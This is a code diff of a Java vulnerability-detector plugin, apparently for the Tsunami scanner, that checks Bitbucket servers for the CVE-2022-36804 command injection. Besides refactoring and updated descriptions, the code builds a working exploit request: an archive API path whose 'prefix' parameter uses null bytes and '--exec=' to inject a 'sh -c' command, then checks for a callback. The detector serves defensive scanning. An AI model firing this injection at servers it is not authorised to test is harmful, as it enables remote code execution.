@@ -42,14 +42,12 @@ import java.util.regex.Pattern;
         name = "Cve202236804VulnDetector",
         version = "0.1",
         description =
-                "A vulnerability in Bitbucket allows a remote, An attacker with access "
-                        + "to a public Bitbucket repository or with read permissions to a"
-                        + "private one can execute arbitrary code by sending a malicious "
-                        + "HTTP request. This All versions released after 6.10.17 "
-                        + "including 7.0.0 and newer are affected, this means that all "
-                        + "instances that are running any versions between 7.0.0 and "
-                        + "8.3.0 inclusive can be exploited by this vulnerability.",
-        author = "SuperX (SuperX.SIR@proton.me)",
+                "A vulnerability in Bitbucket allows a remote code execution.  An attacker with access with read or "
+                        + "public access to a repository can execute arbitrary code by sending a malicious HTTP request"
+                        + ". All versions released after 6.10.17 including 7.0.0 and newer are affected, this means "
+                        + "that all instances that are running any versions between 7.0.0 and 8.3.0 inclusive can be "
+                        + "exploited by this vulnerability.",
+        author = "SuperX.SIR (SuperX.SIR@proton.me)",
         bootstrapModule = Cve202236804DetectorBootstrapModule.class)
 public class Cve202236804VulnDetector implements VulnDetector {
 
@@ -73,21 +71,6 @@ public class Cve202236804VulnDetector implements VulnDetector {
                 || NetworkServiceUtils.isWebService(networkService);
     }
 
-    private static String buildTargetUrl(NetworkService networkService, String url) {
-        StringBuilder targetUrlBuilder = new StringBuilder();
-        if (NetworkServiceUtils.isWebService(networkService)) {
-            targetUrlBuilder.append(NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
-        } else {
-            // Assume the service uses HTTP protocol when the scanner cannot identify the actual service.
-            targetUrlBuilder
-                    .append("http://")
-                    .append(toUriAuthority(networkService.getNetworkEndpoint()))
-                    .append("/");
-        }
-        targetUrlBuilder.append(url);
-        return targetUrlBuilder.toString();
-    }
-
     private boolean isServiceVulnerable(NetworkService networkService) {
 
         PayloadGeneratorConfig config =
@@ -100,29 +83,32 @@ public class Cve202236804VulnDetector implements VulnDetector {
                         .build();
 
         if (!payloadGenerator.isCallbackServerEnabled()) {
+            logger.atInfo().log("Callback server is not available!");
             return false;
         }
         Payload payload = this.payloadGenerator.generate(config);
 
         String commandToInject = String.format("sh -c \"%s\"", payload.getPayload());
 
-        String PubRepUrl = buildTargetUrl(networkService, GET_ALL_PUB_PATH);
+        String PubRepUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + GET_ALL_PUB_PATH;
 
         try {
             HttpResponse httpResponse =
                     httpClient.send(get(PubRepUrl).withEmptyHeaders().build(), networkService);
-            if (httpResponse.status().code() == 200
-                    && httpResponse.bodyString().get().contains(STRING_PUB_REP)) {
-                String Publink = getArchiveLink(getPubLink(String.valueOf(httpResponse.bodyString())), URLEncoder.encode(commandToInject));
-                if (Publink.length() == 0) {
-                    return false;
-                } else {
-                    httpClient.send(get(buildTargetUrl(networkService, Publink)).withEmptyHeaders().build(), networkService);
-
-                    return payload.checkIfExecuted();
-                }
-
+            if (httpResponse.status().code() != 200 || !httpResponse.bodyString().get().contains(STRING_PUB_REP)) {
+                return false;
             }
+
+            String Publink = getArchiveLink(getPubLink(String.valueOf(httpResponse.bodyString())),
+                    URLEncoder.encode(commandToInject));
+            if (Publink.length() == 0) {
+                return false;
+            }
+
+            httpClient.send(get(NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + Publink).withEmptyHeaders().build(), networkService);
+            return payload.checkIfExecuted();
+
+
         } catch (IOException e) {
             logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
         }
@@ -133,7 +119,9 @@ public class Cve202236804VulnDetector implements VulnDetector {
 
     private String getPubLink(String response) {
         String publink = "";
-        Matcher matcher = Pattern.compile("<script>require\\('bitbucket/internal/page/global-repository-list/global-repository-list'\\)\\.init\\( document\\.getElementById\\('repository-container'\\),\\{repositoryPage: (.*),\\}\\);</script>").matcher(response);
+        Matcher matcher = Pattern.compile("<script>require\\('bitbucket/internal/page/global-repository-list/global"
+                + "-repository-list'\\)\\.init\\( document\\.getElementById\\('repository-container'\\),"
+                + "\\{repositoryPage: (.*),\\}\\);</script>").matcher(response);
         if (matcher.find()) {
             String res = matcher.group(1);
             JsonElement rootElement = JsonParser.parseString(res);
@@ -162,7 +150,8 @@ public class Cve202236804VulnDetector implements VulnDetector {
             return archiveLink;
         } else {
             URL url = new URL(publink);
-            archiveLink = "rest/api/latest" + url.getPath().substring(0, url.getPath().lastIndexOf("/")) + "/archive?format=zip&prefix=123%00--exec=" + commandToInject +
+            archiveLink = "rest/api/latest" + url.getPath().substring(0, url.getPath().lastIndexOf("/")) + "/archive"
+                    + "?format=zip&prefix=123%00--exec=" + commandToInject +
                     "%00--remote=git@g.com/a/b";
             //logger.atInfo().log("archiveLink urldecode %s ", archiveLink);
             return archiveLink;
@@ -181,29 +170,36 @@ public class Cve202236804VulnDetector implements VulnDetector {
                                 .setMainId(
                                         VulnerabilityId.newBuilder()
                                                 .setPublisher("TSUNAMI_COMMUNITY")
-                                                .setValue("CVE_2022_36804"))
+                                                .setValue("CVE-2022-36804"))
+                                .addRelatedId(
+                                        VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2022-36804"))
                                 .setSeverity(Severity.CRITICAL)
                                 .setTitle(
                                         "CVE-2022-36804: Bitbucket Command injection vulnerability")
                                 .setDescription(
-                                        "A vulnerability in Bitbucket allows a remote, An attacker with access "
-                                                + "to a public Bitbucket repository or with read permissions to a"
-                                                + "private one can execute arbitrary code by sending a malicious "
-                                                + "HTTP request. This All versions released after 6.10.17 "
+                                        "A vulnerability in Bitbucket allows a remote code execution. An attacker "
+                                                + "with access with read or public access to a repository can execute"
+                                                + " arbitrary code by sending a malicious "
+                                                + "HTTP request. All versions released after 6.10.17 "
                                                 + "including 7.0.0 and newer are affected, this means that all "
                                                 + "instances that are running any versions between 7.0.0 and "
                                                 + "8.3.0 inclusive can be exploited by this vulnerability.")
-                                .setRecommendation("Upgrade bitbucket to the latest version"))
-                .build();
+                                .setRecommendation(
+                                        "Update the Bitbucket Server and Data Center  installation to a version that " +
+                                                "provides a fix (7.6.17 (LTS), 7.17.10 (LTS), 7.21.4 (LTS), 8.0.3, 8" +
+                                                ".1.3, 8.2.2, 8.3.1)or later"))
+                                .build();
     }
 
     @Override
-    public DetectionReportList detect(TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
-        logger.atInfo().log("Cve202236804VulnDetector starts detecting.");
+    public DetectionReportList detect(
+            TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
+        logger.atInfo().log("CVE-2022-36804 starts detecting.");
+
         return DetectionReportList.newBuilder()
                 .addAllDetectionReports(
                         matchedServices.stream()
-                                .filter(Cve202236804VulnDetector::isWebServiceOrUnknownService)
+                                .filter(NetworkServiceUtils::isWebService)
                                 .filter(this::isServiceVulnerable)
                                 .map(networkService -> buildDetectionReport(targetInfo, networkService))
                                 .collect(toImmutableList()))
